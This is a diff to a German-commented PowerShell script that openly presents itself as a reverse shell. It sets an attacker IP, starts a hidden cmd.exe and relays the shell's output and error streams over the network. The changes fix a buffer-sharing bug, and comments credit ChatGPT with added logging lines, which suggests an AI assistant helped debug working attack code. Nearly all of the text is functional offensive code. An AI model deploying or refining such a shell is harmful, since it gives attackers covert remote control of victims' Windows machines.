@@ -1,6 +1,5 @@
 # PowerShell-only CMD Reverse Shell (ohne Installationen oder externe Tools)
 # Dieses Skript verwendet nur integrierte Windows-Funktionen, um eine CMD-Reverse-Shell zu erstellen.
-# New
 
 # --- KONFIGURATION START ---
 $ip = "192.168.2.127"  # <--- HIER IHRE ANGREIFER-IP-ADRESSE EINGEBEN!
@@ -18,7 +17,6 @@ function Write-Log ($message) {
     }
 }
 
-# KORRIGIERTE ZEILE HIER (Line 20)
 Write-Log "Script started. Attempting connection to ${ip}:${port}."
 
 try {
@@ -42,6 +40,7 @@ try {
     $process.StartInfo.CreateNoWindow = $true;       # Verhindert, dass ein CMD-Fenster sichtbar wird
     $process.Start();
     Write-Log "cmd.exe process started."
+    Write-Log "cmd.exe running? $($process.HasExited)"; # Zusätzlicher Log-Eintrag von ChatGPT
 
     # Hole die umgeleiteten Streams des cmd.exe-Prozesses
     $input_stream = $process.StandardInput;
@@ -49,38 +48,37 @@ try {
     $error_stream = $process.StandardError;
     Write-Log "Process streams redirected."
 
-    # Erstelle einen Puffer für das Lesen von Daten
-    [byte[]]$buffer = 0..4095 | %{0}; # Puffer für 4KB Daten
+    # Erstelle separate Puffer für das Lesen von Daten (Korrektur hier!)
+    [byte[]]$outBuffer = 0..4095 | ForEach-Object {0}; # Puffer für 4KB Daten vom Standard-Output
+    [byte[]]$errBuffer = 0..4095 | ForEach-Object {0}; # Puffer für 4KB Daten vom Error-Output
 
     # Beginne, Ausgaben vom CMD-Prozess zum Netzwerk-Stream umzuleiten (Output)
-    # Dies geschieht asynchron, um eine reibungslose Interaktion zu gewährleisten.
-    $output_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, {
+    $output_stream.BaseStream.BeginRead($outBuffer, 0, $outBuffer.Length, { # $outBuffer verwenden
         param($ar)
         try {
             $read = $output_stream.BaseStream.EndRead($ar);
             if($read -gt 0) {
-                $stream.Write($buffer, 0, $read);
+                $stream.Write($outBuffer, 0, $read); # $outBuffer verwenden
                 $stream.Flush();
-                $output_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
+                $output_stream.BaseStream.BeginRead($outBuffer, 0, $outBuffer.Length, $ar, $null); # $outBuffer verwenden
             } else {
                 Write-Log "Output stream read returned 0 bytes (likely end of stream)."
             }
         } catch {
             Write-Log "Error in output stream redirection: $($_.Exception.Message)"
-            # Wenn ein Fehler auftritt, versuchen Sie, den Client zu schließen, um Schleife zu beenden.
             if($client.Connected) { $client.Close(); }
         }
     }, $null);
 
     # Mache dasselbe für die Fehlerausgabe
-    $error_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, {
+    $error_stream.BaseStream.BeginRead($errBuffer, 0, $errBuffer.Length, { # $errBuffer verwenden
         param($ar)
         try {
             $read = $error_stream.BaseStream.EndRead($ar);
             if($read -gt 0) {
-                $stream.Write($buffer, 0, $read);
+                $stream.Write($errBuffer, 0, $read); # $errBuffer verwenden
                 $stream.Flush();
-                $error_stream.BaseStream.BeginRead($buffer, 0, $buffer.Length, $ar, $null);
+                $error_stream.BaseStream.BeginRead($errBuffer, 0, $errBuffer.Length, $ar, $null); # $errBuffer verwenden
             } else {
                 Write-Log "Error stream read returned 0 bytes (likely end of stream)."
             }
@@ -97,6 +95,7 @@ try {
         try {
             # Überprüfen Sie, ob Daten vom Listener zum Lesen verfügbar sind, um Blockierung zu vermeiden
             if ($stream.DataAvailable) {
+                Write-Log "Checking stream.DataAvailable"; # Log-Eintrag von ChatGPT
                 $data = $sr.ReadLine(); # Lese eine Zeile vom Netzwerk-Stream (vom Listener)
                 Write-Log "Received data: '$data'"
                 if ($data -ne $null) { # Stelle sicher, dass die Zeile nicht null ist (bei Verbindungsverlust)
